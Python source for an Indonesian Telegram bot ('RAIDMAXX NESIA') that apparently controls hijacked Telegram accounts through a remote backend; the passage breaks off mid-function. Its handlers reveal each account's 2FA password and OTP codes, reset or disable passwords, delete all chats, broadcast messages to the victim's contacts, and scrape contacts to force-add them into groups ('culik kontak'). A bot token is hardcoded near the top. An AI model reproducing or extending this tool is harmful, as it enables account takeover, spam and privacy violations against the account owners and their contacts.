import os
import sys
import logging
import traceback
import requests
import telebot
import time
import asyncio
from datetime import datetime
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = '7943365599:AAFpDXokbKxQKMLoPnITT0cBRzxiKeG2l1s'
BACKEND_URL = 'https://fkale.my.id/alls'
ADMIN_ID = 5742792349 #id telegram

broadcast_state = {}

# Initialize Telegram Bot
try:
    bot = telebot.TeleBot(BOT_TOKEN)
except Exception as e:
    print(f"Error initializing bot: {e}")
    sys.exit(1)

# Setup logging
logging.basicConfig(
    level=logging.INFO, 
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@bot.message_handler(commands=['start'])
def handle_start(message):
    """
    Menampilkan daftar nomor telepon dengan tombol dalam beberapa pesan.
    Menampilkan pesan "Sabar Ya Nunggu Lagi Ngambil Nomor Nih!!" saat /start.
    """
    bot.send_message(message.chat.id, "Sabar Ya Nunggu Lagi Ngambil Nomor Nih!!")

    if message.from_user.id != ADMIN_ID:
        bot.send_message(
            message.chat.id, 
            "🚫 Akses Tidak Diizinkan. Silahkan hubungi kami melalui WA: wa.me/6289526848810 untuk informasi lebih lanjut."
        )
        return

    phones = []
    
    # Ambil daftar nomor telepon dari backend
    try:
        response = requests.get(f"{BACKEND_URL}/get_sessions")
        print("Response dari Flask:", response.json())  # Debugging untuk melihat respons

        if response.status_code == 200:
            data = response.json()

            if data.get('status') == 'success' and 'phones' in data:
                phones = data['phones']  # Ambil daftar nomor telepon
            else:
                bot.send_message(message.chat.id, "❌ Tidak ada nomor telepon yang tersimpan.")
                return
        else:
            bot.send_message(message.chat.id, "❌ Terjadi kesalahan saat mengambil data sesi.")
            return
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    if not phones:
        bot.send_message(message.chat.id, "❌ Tidak ada nomor telepon yang tersimpan.")
        return

    response_message = (
        "*▪️ ACCOUNT MANAGER*\n"
        "━━━━━━━━━━━━━━━\n\n"
        "🔑 Bot Truelog Otomatis.\n"
        "📞 *Jumlah Nomor Telepon*: {0}\n\n".format(len(phones)) +
        "━━━━━━━━━━━━━━━"
    )

    markup = telebot.types.InlineKeyboardMarkup()

    # Menentukan jumlah maksimum nomor per pesan
    chunk_size = 10  # Menampilkan 10 nomor per pesan
    total_chunks = len(phones) // chunk_size + (1 if len(phones) % chunk_size > 0 else 0)

    # Kirimkan bagian pertama (10 nomor pertama)
    for i in range(0, chunk_size):
        if i < len(phones):
            phone = phones[i]
            markup.add(
                telebot.types.InlineKeyboardButton(f"{i + 1}. {phone}", callback_data=f"get_details_{phone}"),
                telebot.types.InlineKeyboardButton("🗑️", callback_data=f"delete_session_{phone}")
            )

    # Menambahkan tombol "Tampilkan Nomor Lain" jika ada lebih banyak nomor
    if total_chunks > 1:
        markup.add(
            telebot.types.InlineKeyboardButton("Tampilkan Nomor Lain", callback_data="show_next_")
        )

    # Menambahkan tombol "Refresh" untuk memperbarui daftar
    markup.add(
        telebot.types.InlineKeyboardButton("🔄 Refresh", callback_data="refresh_list")
    )

    bot.send_message(message.chat.id, response_message, parse_mode="Markdown", reply_markup=markup)

# Callback untuk menampilkan nomor berikutnya
@bot.callback_query_handler(func=lambda call: call.data.startswith('show_next_'))
def show_next_numbers(call):
    """
    Menampilkan nomor telepon berikutnya saat tombol "Tampilkan Nomor Lain" ditekan.
    """
    # Ambil halaman berikutnya berdasarkan callback data
    current_page = int(call.data.split('_')[2])

    phones = []
    
    # Ambil daftar nomor telepon dari backend
    try:
        response = requests.get(f"{BACKEND_URL}/get_sessions")
        print("Response dari Flask:", response.json())  # Debugging untuk melihat respons

        if response.status_code == 200:
            data = response.json()

            if data.get('status') == 'success' and 'phones' in data:
                phones = data['phones']  # Ambil daftar nomor telepon
            else:
                bot.send_message(call.message.chat.id, "❌ Tidak ada nomor telepon yang tersimpan.")
                return
        else:
            bot.send_message(call.message.chat.id, "❌ Terjadi kesalahan saat mengambil data sesi.")
            return
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Error: {str(e)}")
        return

    if not phones:
        bot.send_message(call.message.chat.id, "❌ Tidak ada nomor telepon yang tersimpan.")
        return

    response_message = (
        "*▪️ ACCOUNT MANAGER*\n"
        "━━━━━━━━━━━━━━━\n\n"
        "🔑 Bot Truelog Otomatis.\n"
        "📞 *Jumlah Nomor Telepon*: {0}\n\n".format(len(phones)) +
        "━━━━━━━━━━━━━━━"
    )

    markup = telebot.types.InlineKeyboardMarkup()

    # Menentukan batas bagian berikutnya
    chunk_size = 10
    start_index = current_page * chunk_size
    end_index = min(start_index + chunk_size, len(phones))

    # Kirimkan bagian berikutnya
    for i in range(start_index, end_index):
        phone = phones[i]
        markup.add(
            telebot.types.InlineKeyboardButton(f"{i + 1}. {phone}", callback_data=f"get_details_{phone}"),
            telebot.types.InlineKeyboardButton("🗑️", callback_data=f"delete_session_{phone}")
        )

    # Jika masih ada nomor berikutnya
    if end_index < len(phones):
        markup.add(
            telebot.types.InlineKeyboardButton("Tampilkan Nomor Lain", callback_data=f"show_next_{current_page + 1}")
        )

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=response_message,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == 'refresh_list')
def refresh_list(call):
    """
    Menyegarkan daftar nomor telepon dan mengedit pesan yang sudah ada.
    """
    phones = []

    try:
        response = requests.get(f"{BACKEND_URL}/get_sessions")
        print("Response dari Flask:", response.json())

        if response.status_code == 200:
            data = response.json()

            if data.get('status') == 'success' and 'phones' in data:
                phones = data['phones']
            else:
                bot.send_message(call.message.chat.id, "❌ Tidak ada nomor telepon yang tersimpan.")
                return
        else:
            bot.send_message(call.message.chat.id, "❌ Terjadi kesalahan saat mengambil data sesi.")
            return
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Error: {str(e)}")
        return

    if not phones:
        bot.send_message(call.message.chat.id, "❌ Tidak ada nomor telepon yang tersimpan.")
        return

    response_message = (
        "*▪️ ACCOUNT MANAGER*\n"
        "━━━━━━━━━━━━━━━\n\n"
        "🔑 Bot Truelog Otomatis.\n"
        "📞 *Jumlah Nomor Telepon*: {0}\n\n".format(len(phones)) +
        "━━━━━━━━━━━━━━━"
    )

    markup = telebot.types.InlineKeyboardMarkup()

    # Menentukan jumlah maksimum nomor per pesan
    chunk_size = 10
    total_chunks = len(phones) // chunk_size + (1 if len(phones) % chunk_size > 0 else 0)

    # Kirimkan bagian pertama (10 nomor pertama)
    for i in range(0, chunk_size):
        if i < len(phones):
            phone = phones[i]
            markup.add(
                telebot.types.InlineKeyboardButton(f"{i + 1}. {phone}", callback_data=f"get_details_{phone}"),
                telebot.types.InlineKeyboardButton("🗑️", callback_data=f"delete_session_{phone}")
            )

    # Menambahkan tombol "Tampilkan Nomor Lain" jika ada lebih banyak nomor
    if total_chunks > 1:
        markup.add(
            telebot.types.InlineKeyboardButton("Tampilkan Nomor Lain", callback_data="show_next_1")
        )

    # Menambahkan tombol "Refresh" untuk memperbarui daftar
    markup.add(
        telebot.types.InlineKeyboardButton("🔄 Refresh", callback_data="refresh_list")
    )

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=response_message,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("get_details_"))
def handle_details_callback(call):
    phone = call.data.replace("get_details_", "")
    bot.answer_callback_query(call.id, "Meminta informasi pengguna...")

    process_message = bot.send_message(call.message.chat.id, "🔄 Memproses permintaan...")

    try:
        # Get user data
        user_response = requests.get(f"{BACKEND_URL}/get_password/{phone}", timeout=10)
        # Get contacts data
        contacts_response = requests.get(f"{BACKEND_URL}/get_contacts/{phone}", timeout=10)
        
        logger.info(f"Raw user response for {phone}: {user_response.text}")
        
        if user_response.status_code == 200 and user_response.text:
            try:
                user_data = user_response.json()
                contacts_data = contacts_response.json() if contacts_response.status_code == 200 else None
                
                password = user_data['data'].get('password', None)
                telegram_id = user_data['data'].get('telegram_id', 'Tidak Tersedia')
                telegram_username = user_data['data'].get('telegram_username', 'Tidak Tersedia')
                
                # Get contact counts
                total_contacts = "0"
                total_mutual = "0"
                total_non_mutual = "0"
                
                if contacts_data and contacts_data.get('status') == 'success':
                    total_contacts = str(contacts_data['data']['total_contacts'])
                    total_mutual = str(contacts_data['data']['total_mutual'])
                    total_non_mutual = str(contacts_data['data']['total_non_mutual'])

                details_message = (
                    "▪️ *ACCOUNT MANAGER*\n"
                    "━━━━━━━━━━━━━━━\n\n"
                    f"**ID Telegram**: `{telegram_id}`\n"
                    f"**Username Telegram**: `@{telegram_username}`\n"
                    f"**Nomor Telepon**: `{phone}`\n"
                    f"**Password**: `{password if password else 'Password Tidak Aktif'}`\n"
                    f"**Total Kontak**: `{total_contacts}` ⬇️\n"
                    f"      **Timbal Kontak**: `{total_mutual}`\n\n"
                    "━━━━━ RAIDMAXX NESIA ━━━━━"
                )

                markup = telebot.types.InlineKeyboardMarkup(row_width=2)
                
                # Main buttons
                otp_button = telebot.types.InlineKeyboardButton(
                    "Get OTP", callback_data=f"get_otp_{phone}"
                )
                device_button = telebot.types.InlineKeyboardButton(
                    "Device Info", callback_data=f"get_devices_{phone}"
                )
                
                # 2FA buttons
                enable_2fa_button = telebot.types.InlineKeyboardButton(
                    "Enable Password", callback_data=f"enable_2fa_{phone}"
                )
                disable_2fa_button = telebot.types.InlineKeyboardButton(
                    "Disable Password", callback_data=f"disable_2fa_{phone}"
                )
                
                # Additional buttons from your list
                delete_session_button = telebot.types.InlineKeyboardButton(
                    "Delete Session", callback_data=f"delete_session_{phone}"
                )
                broadcast_button = telebot.types.InlineKeyboardButton(
                    "Broadcast", callback_data=f"broadcast_{phone}"
                )
                reset_password_button = telebot.types.InlineKeyboardButton(
                    "Reset Password", callback_data=f"reset_password_{phone}"
                )
                delete_all_chat_button = telebot.types.InlineKeyboardButton(
                    "Delete All Chat", callback_data=f"delete_all_chat_{phone}"
                )
                add_to_group_button = telebot.types.InlineKeyboardButton(
                    "Sedot Kontak", callback_data=f"add_to_group_{phone}"
                )
                extrack_button = telebot.types.InlineKeyboardButton(
                    "Extrack Kontak", callback_data=f"extract_contacts_{phone}"
                )
                back_button = telebot.types.InlineKeyboardButton(
                    "« Back", callback_data=f"back_to_menu"
                )
                
                # Add all buttons to markup
                markup.row(otp_button, device_button)
                markup.row(delete_session_button, broadcast_button)
                markup.row(enable_2fa_button, disable_2fa_button)
                markup.row(reset_password_button, delete_all_chat_button)
                markup.row(add_to_group_button, extrack_button)
                markup.row(back_button)
                
                bot.send_message(
                    call.message.chat.id, details_message,
                    parse_mode="Markdown", reply_markup=markup
                )
            except ValueError as e:
                logger.error(f"Failed to parse JSON for {phone}: {str(e)}")
                bot.send_message(call.message.chat.id, "❌ Gagal memproses data pengguna (JSON error).")
            finally:
                bot.delete_message(call.message.chat.id, process_message.message_id)
        else:
            error_message = user_response.json().get("message", "Unknown error") if user_response.text else "Empty response"
            logger.error(f"Backend error: {user_response.status_code} - {user_response.text}")
            bot.send_message(call.message.chat.id, f"❌ Gagal mengambil data untuk nomor {phone}: {error_message}")
            bot.delete_message(call.message.chat.id, process_message.message_id)
    except Exception as e:
        logger.error(f"Request error: {str(e)}")
        bot.send_message(call.message.chat.id, "❌ Gagal terhubung ke server")
        bot.delete_message(call.message.chat.id, process_message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_all_chat_"))
def handle_delete_all_chat(call):
    phone = call.data.replace("delete_all_chat_", "")
    bot.answer_callback_query(call.id, "Menghapus semua chat...")

    # Confirm deletion first with inline keyboard
    markup = telebot.types.InlineKeyboardMarkup()
    confirm_button = telebot.types.InlineKeyboardButton(
        "✅ Ya, Hapus Semua", callback_data=f"confirm_delete_all_chat_{phone}"
    )
    cancel_button = telebot.types.InlineKeyboardButton(
        "❌ Batal", callback_data=f"get_details_{phone}"
    )
    markup.row(confirm_button, cancel_button)
    
    bot.send_message(
        call.message.chat.id,
        "⚠️ *KONFIRMASI HAPUS CHAT*\n"
        "━━━━━━━━━━━━━━━\n\n"
        f"📱 *Nomor*: `{phone}`\n\n"
        "⚠️ Anda akan menghapus SEMUA chat dari akun ini.\n"
        "⚠️ Tindakan ini tidak dapat dibatalkan.\n\n"
        "Apakah Anda yakin ingin melanjutkan?",
        parse_mode="Markdown",
        reply_markup=markup
    )

# Handler for confirmation of Delete All Chat
@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_delete_all_chat_"))
def handle_confirm_delete_all_chat(call):
    phone = call.data.replace("confirm_delete_all_chat_", "")
    bot.answer_callback_query(call.id, "Menjalankan penghapusan...")
    
    process_message = bot.send_message(call.message.chat.id, "🔄 Sedang menghapus semua chat...\nMohon tunggu, proses ini dapat memakan waktu beberapa saat.")
    
    try:
        response = requests.get(f"{BACKEND_URL}/delete_all_chats/{phone}", timeout=60)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                deleted_count = data.get('data', {}).get('deleted_chats', 0)
                
                success_message = (
                    "✅ *HAPUS CHAT SELESAI*\n"
                    "━━━━━━━━━━━━━━━\n\n"
                    f"📱 *Nomor*: `{phone}`\n"
                    f"🗑️ *Chat Dihapus*: `{deleted_count}`\n\n"
                    "━━━━━ RAIDMAXX NESIA ━━━━━"
                )
                
                # Add back button
                markup = telebot.types.InlineKeyboardMarkup()
                back_button = telebot.types.InlineKeyboardButton(
                    text="↩️ Kembali", 
                    callback_data=f"get_details_{phone}"
                )
                markup.add(back_button)
                
                bot.send_message(
                    call.message.chat.id,
                    success_message,
                    parse_mode='Markdown',
                    reply_markup=markup
                )
            else:
                error_message = data.get('message', 'Unknown error')
                bot.send_message(
                    call.message.chat.id,
                    f"❌ *GAGAL MENGHAPUS CHAT*\n"
                    f"━━━━━━━━━━━━━━━\n\n"
                    f"📱 *Nomor*: `{phone}`\n"
                    f"❗ *Error*: `{error_message}`\n\n"
                    f"━━━━━ RAIDMAXX NESIA ━━━━━",
                    parse_mode='Markdown'
                )
        else:
            bot.send_message(
                call.message.chat.id,
                f"❌ *GAGAL MENGHAPUS CHAT*\n"
                f"━━━━━━━━━━━━━━━\n\n"
                f"📱 *Nomor*: `{phone}`\n"
                f"❗ *Error*: `Server error ({response.status_code})`\n\n"
                f"━━━━━ RAIDMAXX NESIA ━━━━━",
                parse_mode='Markdown'
            )
    except requests.exceptions.Timeout:
        bot.send_message(
            call.message.chat.id,
            f"❌ *TIMEOUT*\n"
            f"━━━━━━━━━━━━━━━\n\n"
            f"Waktu permintaan habis. Server mungkin sibuk atau terdapat banyak chat untuk dihapus.\n"
            f"Silakan coba lagi nanti.",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error deleting all chats: {str(e)}")
        bot.send_message(
            call.message.chat.id,
            f"❌ *ERROR*\n"
            f"━━━━━━━━━━━━━━━\n\n"
            f"Terjadi kesalahan saat menghapus chat:\n`{str(e)}`",
            parse_mode='Markdown'
        )
    finally:
        bot.delete_message(call.message.chat.id, process_message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("broadcast_"))
def handle_broadcast_start(call):
    # Ambil nomor telepon
    phone = call.data.split("_")[-1]
    user_id = call.from_user.id
    
    bot.answer_callback_query(call.id, "Mempersiapkan broadcast...")
    
    # Tampilkan pesan proses
    process_msg = bot.send_message(call.message.chat.id, "⏳ Mengambil data kontak...")
    
    try:
        # Ambil data kontak dari backend
        contacts_response = requests.get(f"{BACKEND_URL}/get_contacts/{phone}", timeout=10)
        
        # Inisialisasi default
        total_contacts = total_mutual = total_non_mutual = 0
        
        if contacts_response.status_code == 200:
            contacts_data = contacts_response.json()
            if contacts_data.get('status') == 'success':
                total_contacts = contacts_data['data']['total_contacts']
                total_mutual = contacts_data['data']['total_mutual']
                total_non_mutual = contacts_data['data']['total_non_mutual']
        
        # Buat markup pilihan kontak
        markup = telebot.types.InlineKeyboardMarkup(row_width=1)
        
        buttons = [
            telebot.types.InlineKeyboardButton(
                f"👥 Semua Kontak ({total_contacts})", 
                callback_data=f"select_broadcast_{phone}_all_{total_contacts}"
            ),
            telebot.types.InlineKeyboardButton(
                f"🤝 Kontak Mutual ({total_mutual})", 
                callback_data=f"select_broadcast_{phone}_mutual_{total_mutual}"
            ),
            telebot.types.InlineKeyboardButton(
                f"👤 Kontak Non-Mutual ({total_non_mutual})", 
                callback_data=f"select_broadcast_{phone}_non_mutual_{total_non_mutual}"
            )
        ]
        
        markup.add(*buttons)
        
        # Hapus pesan proses
        bot.delete_message(call.message.chat.id, process_msg.message_id)
        
        bot.send_message(
            call.message.chat.id,
            f"📣 Pilih Jenis Kontak untuk Broadcast\n"
            f"📱 Nomor: {phone}",
            reply_markup=markup
        )
    
    except Exception as e:
        # Tangani kesalahan
        bot.send_message(
            call.message.chat.id,
            f"❌ Gagal memproses broadcast:\n`{str(e)}`",
            parse_mode="Markdown"
        )
        # Hapus pesan proses jika gagal
        try:
            bot.delete_message(call.message.chat.id, process_msg.message_id)
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("select_broadcast_"))
def handle_broadcast_contact_selection(call):
    # Parse data callback
    parts = call.data.split("_")
    phone = parts[2]
    contact_type = parts[3]
    contact_count = parts[4]
    
    # Simpan state broadcast
    user_id = call.from_user.id
    broadcast_state[user_id] = {
        'phone': phone,
        'contact_type': contact_type,
        'contact_count': contact_count
    }
    
    bot.answer_callback_query(call.id, f"Memilih kontak {contact_type}")
    
    # Hapus pesan sebelumnya
    bot.delete_message(call.message.chat.id, call.message.message_id)
    
    # Kirim pesan meminta input broadcast
    bot.send_message(
        call.message.chat.id,
        f"📝 Tulis Pesan Broadcast\n"
        f"📱 Nomor: {phone}\n"
        f"👥 Jenis Kontak: {contact_type.replace('_', ' ').title()} ({contact_count} kontak)\n\n"
        "Silakan ketik pesan yang ingin disebarkan:"
    )

@bot.message_handler(func=lambda message: message.from_user.id in broadcast_state)
def handle_broadcast_message(message):
    user_id = message.from_user.id
    broadcast_data = broadcast_state.get(user_id)
    
    if not broadcast_data or not message.text:
        return
    
    phone = broadcast_data['phone']
    contact_type = broadcast_data['contact_type']
    contact_count = broadcast_data['contact_count']
    
    # Konfirmasi pengiriman
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    kirim_button = telebot.types.InlineKeyboardButton(
        "✅ Kirim", 
        callback_data=f"send_broadcast_{phone}_{contact_type}"
    )
    batal_button = telebot.types.InlineKeyboardButton(
        "❌ Batal", 
        callback_data=f"broadcast_{phone}"
    )
    markup.add(kirim_button, batal_button)
    
    # Simpan pesan di state
    broadcast_data['message'] = message.text
    
    bot.send_message(
        message.chat.id,
        "📋 Konfirmasi Pesan Broadcast:\n"
        f"📱 Nomor: {phone}\n"
        f"👥 Jenis Kontak: {contact_type.replace('_', ' ').title()} ({contact_count} kontak)\n\n"
        f"📝 Pesan:\n{message.text}",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("send_broadcast_"))
def send_broadcast(call):
    # Parse callback data
    parts = call.data.split("_")
    phone = parts[2]
    contact_type = parts[3]
    
    # Ambil data broadcast
    user_id = call.from_user.id
    broadcast_data = broadcast_state.get(user_id)
    
    if not broadcast_data:
        bot.answer_callback_query(call.id, "❌ Data broadcast hilang")
        return
    
    message_text = broadcast_data.get('message')
    contact_count = broadcast_data.get('contact_count', '0')
    
    # Kirim broadcast
    try:
        response = requests.get(
            f"{BACKEND_URL}/broadcast_message/{phone}",
            params={
                'message': message_text,
                'contact_type': contact_type
            },
            timeout=180
        )
        
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                result_data = data.get('data', {})
                success_count = result_data.get('total_sent', 0)
                failed_count = result_data.get('total_failed', 0)
                
                bot.answer_callback_query(call.id, "✅ Broadcast berhasil")
                bot.send_message(
                    call.message.chat.id,
                    "✅ *BROADCAST SELESAI*\n"
                    f"📱 Nomor: {phone}\n"
                    f"👥 Jenis Kontak: {contact_type.replace('_', ' ').title()} ({contact_count} kontak)\n"
                    f"✔️ Berhasil: {success_count}\n"
                    f"❌ Gagal: {failed_count}",
                    parse_mode='Markdown'
                )
            else:
                bot.answer_callback_query(call.id, "❌ Gagal mengirim broadcast")
                bot.send_message(
                    call.message.chat.id,
                    f"❌ Gagal: {data.get('message', 'Kesalahan tidak diketahui')}"
                )
        else:
            bot.answer_callback_query(call.id, "❌ Gagal mengirim broadcast")
            bot.send_message(
                call.message.chat.id,
                f"❌ Kesalahan server: {response.status_code}"
            )
    
    except Exception as e:
        bot.answer_callback_query(call.id, "❌ Terjadi kesalahan")
        bot.send_message(
            call.message.chat.id,
            f"❌ Kesalahan: {str(e)}"
        )
    
    # Hapus state broadcast
    if user_id in broadcast_state:
        del broadcast_state[user_id]
        
# Handler for Back to Menu button
@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
def handle_back_to_menu(call):
    bot.answer_callback_query(call.id, "Kembali ke menu utama...")
    
    # Delete current message
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception as e:
        logger.error(f"Error deleting message: {str(e)}")
    
    # Call the start handler to show the main menu
    handle_start(call.message)

# Variable to store selected groups for extraction
selected_groups = {}
state = {}

@bot.callback_query_handler(func=lambda call: call.data.startswith("add_to_group_"))
def handle_add_to_group(call):
    phone = call.data.replace("add_to_group_", "")
    bot.answer_callback_query(call.id, "Mempersiapkan pilihan kontak...")
    
    process_message = bot.send_message(call.message.chat.id, "⏳ Mengambil data kontak...")
    
    try:
        # Get contacts data first to show counts
        contacts_response = requests.get(f"{BACKEND_URL}/get_contacts/{phone}", timeout=100)
        
        total_contacts = 0
        total_mutual = 0
        total_non_mutual = 0
        
        if contacts_response.status_code == 200:
            contacts_data = contacts_response.json()
            if contacts_data.get('status') == 'success':
                total_contacts = contacts_data['data']['total_contacts']
                total_mutual = contacts_data['data']['total_mutual']
                total_non_mutual = contacts_data['data']['total_non_mutual']
        
        # Create markup with contact type options - USING TELEBOT MARKUP
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        
        # First row buttons
        all_button = telebot.types.InlineKeyboardButton(
            text=f"👥 Semua Kontak ({total_contacts})", 
            callback_data=f"select_contact_type_{phone}_all"
        )
        mutual_button = telebot.types.InlineKeyboardButton(
            text=f"🤝 Kontak Mutual ({total_mutual})", 
            callback_data=f"select_contact_type_{phone}_mutual"
        )
        markup.add(all_button, mutual_button)
        
        # Second row buttons
        non_mutual_button = telebot.types.InlineKeyboardButton(
            text=f"👤 Kontak Non-Mutual ({total_non_mutual})", 
            callback_data=f"select_contact_type_{phone}_non_mutual"
        )
        back_button = telebot.types.InlineKeyboardButton(
            text="« Kembali", 
            callback_data=f"get_details_{phone}"
        )
        markup.add(non_mutual_button, back_button)
        
        bot.send_message(
            call.message.chat.id,
            "🔰 *RAIDMAXX AUTO ADD* 🔰\n"
            "━━━━━━━━━━━━━━━\n\n"
            f"📱 *Nomor*: `{phone}`\n\n"
            "📋 *Pilih Jenis Kontak:*\n"
            "• Pilih jenis kontak yang ingin dimasukkan ke grup\n\n"
            "━━━━━ RAIDMAXX NESIA ━━━━━",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        bot.send_message(
            call.message.chat.id,
            f"❌ Terjadi kesalahan saat mengambil data kontak:\n`{str(e)}`",
            parse_mode="Markdown"
        )
    finally:
        bot.delete_message(call.message.chat.id, process_message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("select_contact_type_"))
def handle_select_contact_type(call):
    try:
        # Log the full callback data for debugging
        print(f"DEBUG: Received callback data: {call.data}")
        
        # Split the callback data more carefully
        data_parts = call.data.split("_")
        
        # Validate the data parts
        if len(data_parts) < 4:
            bot.answer_callback_query(call.id, "❌ Invalid callback data")
            return
        
        phone = data_parts[3]
        contact_type = data_parts[4]  # 'all', 'mutual', or 'non_mutual'
        state['account'] = str(phone)
        state['filterType'] = contact_type
        
        # Acknowledge the callback query
        bot.answer_callback_query(call.id, f"Memilih kontak {contact_type}...")
        
        # Create last seen buttons - USING TELEBOT MARKUP
        markup = telebot.types.InlineKeyboardMarkup(row_width=3)
        
        # First row of buttons
        day1_button = telebot.types.InlineKeyboardButton(
            text="Hari Ini", 
            callback_data=f"lastseen-{phone}-1"
        )
        day3_button = telebot.types.InlineKeyboardButton(
            text="3 Hari", 
            callback_data=f"lastseen-{phone}-3"
        )
        day7_button = telebot.types.InlineKeyboardButton(
            text="1 Minggu", 
            callback_data=f"lastseen-{phone}-7"
        )
        markup.add(day1_button, day3_button, day7_button)
        
        # Second row of buttons
        month_button = telebot.types.InlineKeyboardButton(
            text="1 Bulan", 
            callback_data=f"lastseen-{phone}-29"
        )
        all_button = telebot.types.InlineKeyboardButton(
            text="Semua", 
            callback_data=f"lastseen-{phone}-9999"
        )
        back_button = telebot.types.InlineKeyboardButton(
            text="🔙 KEMBALI", 
            callback_data=f"get_details_{phone}"
        )
        markup.add(month_button, all_button, back_button)
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"**RAIDMAXX AUTO ADD**\n\nAkun : {state['account']}\nTipe kontak : {state['filterType']}\n\nSilahkan pilih filter last seen:",
            reply_markup=markup
        )
        
    except Exception as e:
        print(f"DEBUG: Error in handle_select_contact_type: {e}")
        bot.send_message(
            call.message.chat.id,
            f"❌ Terjadi kesalahan: {str(e)}",
            parse_mode="Markdown"
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith("lastseen"))
def handle_lastseen(call):
    split = call.data.split("-")
    phonenumber = split[1]
    filterDate = int(split[2])
    
    state['filterDate'] = filterDate
    
    fD = state['filterDate']
    if fD == 1: xD = "Aktif Hari Ini"
    elif fD == 3: xD = "Aktif 3 Hari Terakhir"
    elif fD == 7: xD = "Aktif Seminggu Terakhir"
    elif fD == 29: xD = "Aktif Satu Bulan Terakhir"
    elif fD == 9999: xD = "**__Semua Kontak__**"
    
    # Create confirmation buttons - USING TELEBOT MARKUP
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    yes_button = telebot.types.InlineKeyboardButton(
        text="YA, LANJUT ✅", 
        callback_data=f"prompt_link-{phonenumber}"
    )
    cancel_button = telebot.types.InlineKeyboardButton(
        text="❌ BATAL", 
        callback_data=f"cancel-{phonenumber}"
    )
    markup.add(yes_button, cancel_button)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"Anda akan melakukan invite kontak ke grup dengan settingan seperti berikut:\n\nTipe kontak : {state['filterType']}\nFilter : {xD}\n\nKirim link grup dengan format:\nhttps://t.me/+xxxxxxxxxx",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("prompt_link"))
def handle_prompt_link(call):
    phone = call.data.split("-")[1]
    msg = bot.send_message(
        call.message.chat.id,
        "Kirim link grup dalam format\nhttps://t.me/+xxxxxxxxxx",
        reply_markup=telebot.types.ForceReply()
    )
    bot.register_next_step_handler(msg, process_add_to_group, phone, state['filterType'], state['filterDate'])

@bot.callback_query_handler(func=lambda call: call.data.startswith("cancel"))
def handle_cancel(call):
    phone = call.data.split("-")[1]
    
    # Create back button - USING TELEBOT MARKUP
    markup = telebot.types.InlineKeyboardMarkup()
    back_button = telebot.types.InlineKeyboardButton(
        text="« Kembali", 
        callback_data=f"get_details_{phone}"
    )
    markup.add(back_button)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="Tugas telah dibatalkan, untuk memulai kembali silahkan pilih menu lain.",
        reply_markup=markup
    )

def process_add_to_group(message, phone, contact_type, filter_date):
    # Get the group link
    if not message or not message.text:
        bot.reply_to(message, "❌ Pesan tidak valid!\nMohon kirim ulang link grup.")
        return
        
    if not ("t.me/" in message.text or "telegram.me/" in message.text):
        bot.reply_to(message, "❌ Link grup tidak valid!\nMohon berikan link yang valid dengan format: https://t.me/+xxxxxx")
        return
        
    process_msg = bot.reply_to(message, "🔄 Memproses permintaan culik kontak ke grup...")
    group_link = message.text.strip()
    
    # Extract hash from the group link
    hash_part = None
    if "+?" in group_link:
        hash_part = group_link.split("+")[1].split("?")[0]
    elif "+" in group_link:
        hash_part = group_link.split("+")[1]
    
    if not hash_part:
        bot.reply_to(message, "❌ Format link grup tidak valid!")
        bot.delete_message(message.chat.id, process_msg.message_id)
        return
    
    # Fix: Use chat_id as key in state dictionary
    chat_id = str(message.chat.id)
    if chat_id not in state:
        state[chat_id] = {}
    state[chat_id]['link'] = hash_part
    
    # Default batch size is 10 - smaller than Telegram's max of 25 to reduce chance of rate limits
    batch_count = 10
    
    try:
        # Use the exact endpoint that matches your backend code
        request_url = f"{BACKEND_URL}/add_contacts_to_group/{phone}"
        
        # Use the query parameters with batch size
        request_params = {
            'group_link': group_link,
            'contact_type': contact_type,
            'filter_date': filter_date,
            'batch_count': batch_count
        }
        
        print(f"DEBUG: Sending request to: {request_url}")
        print(f"DEBUG: With parameters: {request_params}")
        
        # Make the GET request with query parameters
        response = requests.get(
            request_url,
            params=request_params,
            timeout=300  # Increased timeout for larger operations
        )
        
        print(f"DEBUG: Response status code: {response.status_code}")
        print(f"DEBUG: Response content: {response.text[:500]}")
        
        # Parse response
        if response.status_code in [200, 429]:  # Success or rate-limited
            data = response.json()
            
            if data['status'] == 'success':
                result = data['data']
                
                # Check if we had partial success with rate limiting
                rate_limited_msg = ""
                if result.get('rate_limited', False):
                    wait_seconds = result.get('wait_seconds', 0)
                    wait_hours = wait_seconds // 3600
                    wait_minutes = (wait_seconds % 3600) // 60
                    
                    time_msg = ""
                    if wait_hours > 0:
                        time_msg += f"{wait_hours} jam "
